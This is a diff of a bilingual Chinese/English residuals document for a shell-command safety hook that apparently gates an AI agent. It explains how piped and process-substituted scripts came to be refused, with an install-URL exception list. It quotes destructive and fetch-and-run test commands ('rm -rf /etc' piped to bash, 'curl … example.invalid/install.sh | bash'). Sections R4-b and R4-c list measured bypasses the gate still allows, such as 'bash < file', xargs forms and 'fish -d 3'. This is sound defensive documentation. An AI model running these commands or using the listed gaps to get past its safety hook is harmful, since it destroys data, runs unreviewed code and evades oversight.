@@ -169,9 +169,10 @@ commit **逐位元組相同**。閒置時兩邊都綠。
 上界），不是把 1000 改大——那只是把翻紅的負載門檻往上移。
 
 ## R4 — carrier 的腳本從 pipe 或 process substitution 進來時，不會被掃描
+## （2026-09-03 CLOSED-WITH-EXCEPTION-LIST；剩下的部分改列為 R4-b）
 
-**2026-09-03 實測，全部放行**（走真正的 stdin 進入點，payload 是 touch 不是刪除，
-標記檔在 /bin/bash 3.2.57 與 5.3.15 下都出現，所以這些命令是真的會執行）：
+**原本的問題**（2026-09-03 實測，全部放行，走真正的 stdin 進入點，payload 是 touch 不是
+刪除，標記檔在 /bin/bash 3.2.57 與 5.3.15 下都出現，所以這些命令是真的會執行）：
 
 ```
 echo "rm -rf /etc" | bash
@@ -184,44 +185,117 @@ bash <(echo "rm -rf /etc")
 curl -sSL https://example.invalid/install.sh | bash
 ```
 
-對照組：逐位元組等價的 heredoc 寫法 `cat <<EOF | bash` 是**拒絕**的，同一天新增的
-here-string 寫法 `bash <<< "rm -rf /etc"` 也已改成拒絕。差別只在腳本從哪裡進來。
+對照組：逐位元組等價的 heredoc 寫法 `cat <<EOF | bash` 是**拒絕**的，here-string 寫法
+`bash <<< "rm -rf /etc"` 也是。差別只在腳本從哪裡進來。
 
-**為什麼沒修（這是一個政策決定，不是一次遺漏）**：
+**裁決與修法**：使用者於 2026-09-03 裁決採用那條成立的規則，並附一份豁免清單
+（FOLLOWUP.md 決定 1）。規則是：**carrier 的腳本從 pipe 或 process substitution 進來時，
+這道閘門必須讀得到它，否則拒絕執行**。讀得到的只有兩種產生器——字面產生器
+（`echo`／`printf` 的非動態字、`cat <<EOF`，其文字會當成巢狀命令判定）與
+`hooks/protect-important-paths.js` 裡 `PIPED_SCRIPT_EXCEPTIONS` 上的網址前綴；
+其餘一律拒絕，**包含解析器分類不出來的產生器**（沒有 fail-open 的分支）。
+上面八列現在全部是拒絕，README.md 記載的四條安裝路徑仍然放行。
 
-1. **窄修法不成立。** 「carrier 在命令位置、沒有 -c、沒有 heredoc 內文、也沒有檔案
-   操作元時，就去掃前面 echo/printf 階段的字面字串操作元」——這抓得到上面前兩列，
-   卻放過 `cat f | bash`、`curl … | bash`、`bash < file`、`bash <&3`、
-   `python -c … | bash` 以及其他每一種產生器。它把一個開放家族裡的一種寫法收窄，
-   讀起來卻像「已修好」，那比不修更糟。它同時還會新擋掉 `echo "$cmd" | bash`
-   （動態字使巢狀命令不可知，而不可知的命令字會被假設成 rm），那是一個新的誤擋面。
-2. **成立的那條規則會擋掉本專案自己的安裝方式。** 「carrier 的腳本從這道閘門讀不到
-   的地方進來就一律拒絕」是唯一站得住腳的規則，而它會拒絕 README.md 記載的
-   `curl -sSL https://raw.githubusercontent.com/…/install.sh | bash`（含
-   `| bash -s -- -a claude` 的兩種變體）以及 `cat script.sh | bash`。這兩者今天都是
-   放行的。對一道已經接受數個 carrier 殘留的閘門而言，改成拒絕「掃不到的 stdin
-   腳本」是一次真正的姿態改變——那是使用者的決定，不是修 bug 的人的決定。
-3. **process substitution 是第二個機制**，`bash <(echo …)` 有它自己的誤擋面。
+**這條規則新擋掉什麼，明講**：其他專案的 `curl … | sh` 一行安裝法、`cat script.sh | bash`、
+`echo "$cmd" | bash`、中繼段（`… | tee f | bash`、`… | sed … | bash`）、
+`source <(kubectl completion bash)` 這類 completion 慣用寫法，以及 `( … ) | bash` 這種
+複合產生器。清單與繞法寫在 README.md「從 pipe 或 process substitution 進來的腳本會被拒絕」
+那一節，訊息本身也會寫。
 
-**要什麼才能推翻**：使用者裁決要不要接受 (2) 那條規則的誤擋面。在那之前，這一條
-是**已揭露、未修**，而不是沒人看見。與 R1–R3 不同，這一條還沒有雙向釘——它釘不了，
-因為要釘的是一個尚未做成的決定。AGENTS.md 已記載的是 `-exec` 與 xargs 那一族
-（操作元從 stdin 來），這一條講的是不同的東西：**腳本本身**從 stdin 來。
+**豁免清單的性質，明講**：它比對的是命令列上的網址文字，不是身分驗證——任何能寫命令的人都
+能寫出那個前綴，閘門也無法驗證伺服器回什麼。它的職責只是不讓這條規則擋掉本專案自己記載的
+安裝方式。收窄條件（單一網址操作元、拒絕 `..`／百分號逃逸、選項白名單）記在 README.md 與
+`hooks/protect-important-paths.js` 的常數註解裡，理由是實測：`--connect-to`／`--resolve`／
+`--proxy`／`--unix-socket`／`-K`／`-o` 都能在網址文字逐位元組相符的情況下把抓取搬到別處。
 
-**R4 — a shell carrier whose script arrives on a pipe or a process substitution is
-not scanned.** All eight spellings above were measured ALLOW on 2026-09-03 through
-the real stdin entry point, with the deletion replaced by a touch so the marker
-file proves bash really runs them. The byte-equivalent heredoc form
-(`cat <<EOF | bash`) is refused, and the here-string form (`bash <<< "…"`) was
-changed to refuse on the same day; the only difference is where the script comes
-from. It is unfixed because the narrow patch is unsound — it would catch the
-literal-`echo` subset, leave `cat f | bash`, `curl … | bash`, `bash < file`,
-`bash <&3` and every other emitter open while reading as "fixed", and newly refuse
-`echo "$cmd" | bash` — while the rule that IS sound ("a carrier whose script this
-gate cannot read is refused") denies this repository's own documented install
-route, `curl -sSL … | bash` (README.md), and `cat script.sh | bash`. Denying
-unscannable stdin scripts is a genuine change of posture for a gate that already
-accepts several disclosed carrier residuals, so it is the user's call. Process
-substitution is a second mechanism with its own over-refusal surface. Unlike
-R1-R3 this item has no two-way pin, because what would have to be pinned is a
-decision nobody has made yet.
+**雙向釘**：`test-hooks.js` 的 `pipedScriptBlocked`／`exceptionListControls`（走真正的 stdin
+契約，並斷言拒絕理由的文字含 `unscannable piped script` 與 `PIPED_SCRIPT_EXCEPTIONS`）、
+`installRouteAllowances`（四條記載的安裝路徑，並比對 README.md 真的有這四條），以及
+`blocked`／`allowed` 裡的字面產生器與誤擋對照列。規則消失、訊息爛回舊措辭、或豁免清單被放寬
+成裸 host，這三件事各自會讓測試轉紅。
+
+**R4 — closed with an exception list, 2026-09-03.** A shell carrier whose script
+arrives on a pipe or through a process substitution is refused unless this gate
+can READ that script: a literal emitter (`echo`/`printf` words, `cat <<EOF`) is
+scanned as a nested command and judged by the ordinary rules, an install route on
+`PIPED_SCRIPT_EXCEPTIONS` is let through, and everything else -- including a
+producer the parser cannot classify -- is refused with a message that names the
+rule (`unscannable piped script`) and the list to extend. All eight spellings
+above, measured ALLOW that morning through the real stdin entry point with the
+deletion replaced by a touch, are refused now; the four install routes README.md
+documents still pass. The exception list matches URL TEXT and is not an identity
+check, which is why an exempted fetch may carry only options that cannot move it.
+
+## R4-b — 這條規則刻意沒有涵蓋的部分
+
+以下每一列都是 2026-09-04 走真正的 stdin 進入點量出來的**放行**，不是推論：
+
+- `bash < script.sh`、`bash script.sh`——重導向或操作元指向真正的檔案。
+- `bash -c "$(curl …)"`、`eval "$(curl …)"`——**只在沒有 pipe 餵著時**。有 pipe 的
+  `curl … | bash -c "$(cat)"` 從 2026-09-04 起是拒絕的。
+- `… | xargs -I{} bash -c "{}"` 與 `… | xargs -0 bash -c`：`-c` 的命令字串是 xargs 從 pipe
+  補上去的，這道閘門看到的 `-c` 後面根本沒有字。
+- `bash <&3`——fd 3 由別處開啟，而且不是 process substitution 開的。
+  `bash /dev/fd/3 3< <(curl …)` 與 `exec 3< <(curl …); bash /dev/fd/3` 那一族已於
+  2026-09-04 納入。
+- `curl … > >(bash)`——輸出方向的 process substitution，刻意不視為腳本來源。
+- `curl … | busybox sh`、`| python3`、`| perl` 等非 shell（或還要再拆一層 applet）的消費端。
+
+使用者的裁決指名的是 pipe 與 process substitution，而豁免機制是網址形狀而不是路徑形狀；
+把檔案與 fd 那一族納入是另一次姿態改變，範圍大得多（每一個 `bash < f` 都會被擋），該分開問。
+
+**代價，明講而不是藏著**：`cat f | bash` 被拒，而只差一個字元的 `bash < f` 沒有。知道規則的
+人繞得過去，所以 R4 買到的是「閘門不再對一種常見寫法視而不見」，不是「對手拿不到執行」。
+
+**「腳本文字看得見、但裡面的命令替換看不見」這一類，涵蓋到哪裡為止**（實測，不是推論）：
+carrier 自己的 here-string 與 heredoc 內文（`bash <<< "$(curl …)"`、`bash <<EOF` 內文寫著
+`$(curl …)`）、字面 heredoc 產生器的內文（`cat <<EOF | bash` 內文寫著 `$(curl …)`），以及
+**有 pipe 餵著時**的 `-c` 引數（`curl … | bash -c "$(cat)"`，2026-09-04 補上）都會拒絕；
+良性的 `bash <<EOF` + `echo hi` 仍然放行。
+
+**這裡先前寫著「兄弟站點已全部納入」，那句話是假的，已刪除**：寫下它的當天
+`curl … | bash -c "$(cat)"` 是放行的，而它正是同一類的兄弟站點（腳本文字看得見、裡面的替換
+看不見），2026-09-04 才補上。範圍外的部分改成下面那份逐列量過的清單，不再用「全部」這種詞。
+
+**R4-b — deliberately out of scope.** `bash < file`, `bash script.sh`,
+`bash -c "$(curl …)"`, `eval "$(curl …)"`, `… | xargs -I{} bash -c "{}"`,
+`bash <&3`, and non-shell consumers such as `curl … | python3`. The decision named
+pipes and process substitutions, and the exemption mechanism is URL-shaped rather
+than path-shaped; folding in the file/fd family is a second, much larger posture
+change and should be asked separately. Every item above was measured ALLOW on
+2026-09-04 through the real stdin entry point; none of them is reasoned about.
+"The script text is visible but a command substitution inside it is not" is
+covered on the carrier's own here-string and heredoc body (`bash <<< "$(curl …)"`,
+`bash <<EOF` with `$(curl …)` in it), on a literal heredoc producer's body
+(`cat <<EOF | bash` with `$(curl …)` in it) and, since 2026-09-04, on the `-c`
+argument of a PIPE-FED carrier (`curl … | bash -c "$(cat)"`), while the benign
+`bash <<EOF` / `echo hi` twin stays allowed. This paragraph used to claim those
+sibling sites were ALL covered; that sentence was false when it was written --
+`curl … | bash -c "$(cat)"` was allowed at the time and is the same class -- and
+it is deleted rather than softened, because a residuals document that overstates
+its own coverage is the one thing this file exists to prevent.
+
+## R4-c — carrier 選項的「吃掉下一個字」只覆蓋 bash/sh 系的拼法
+
+`hooks/protect-important-paths.js` 的 carrier argv 走訪會吃掉 `-O`／`+O`／`-o`／`+o`／
+`--rcfile`／`--init-file` 的引數（判斷是 `/^[-+][A-Za-z]*[Oo]$/` 加那兩個長選項），涵蓋
+`bash --help` 的 invocation-only 那一整組，以及 sh／dash／zsh／ksh 的 `-o`。**fish 自己那組
+帶引數的選項不在內**：實測 2026-09-04，`curl -sSL <url> | fish -d 3` 與 `| fish --debug 3`
+都是**放行**，因為 `3` 被讀成腳本檔操作元；同一條命令去掉那個選項（`curl … | fish`）是拒絕。
+
+**為什麼不順手修**：正確的修法不是再往那條形狀正則裡多塞幾個字串，而是每個 carrier 各有一份
+「會吃掉下一個字」的選項表——那是一份會隨上游漂移的資料，每加一個名字都得配一列實測的測試，
+而且加錯方向（少吃一個字）就是一個新的 fail-open。fish 在這台機器上不是 login shell，
+`~/bin` 與 launchd 也沒有任何 `| fish` 的用法，所以這一項留著並寫下來，不假裝已經涵蓋。
+
+**R4-c — the option-argument walk covers the bash/sh spellings only.** The carrier
+argv walk consumes the argument of `-O`/`+O`/`-o`/`+o`/`--rcfile`/`--init-file`,
+which is the whole invocation-only group in `bash --help` plus the `-o` of
+sh/dash/zsh/ksh. fish's own argument-taking options are NOT covered: measured
+2026-09-04, `curl -sSL <url> | fish -d 3` and `| fish --debug 3` are ALLOWED,
+because `3` is read as the script FILE operand, while the same command without the
+option (`curl … | fish`) is refused. The right fix is a per-carrier table of
+options that consume the next word -- upstream-drifting data that needs a measured
+row per name, where getting it wrong in the consuming direction is a new fail-open
+-- and fish is not a login shell on this machine and nothing in `~/bin` or launchd
+pipes into it, so this is written down rather than pretended away.
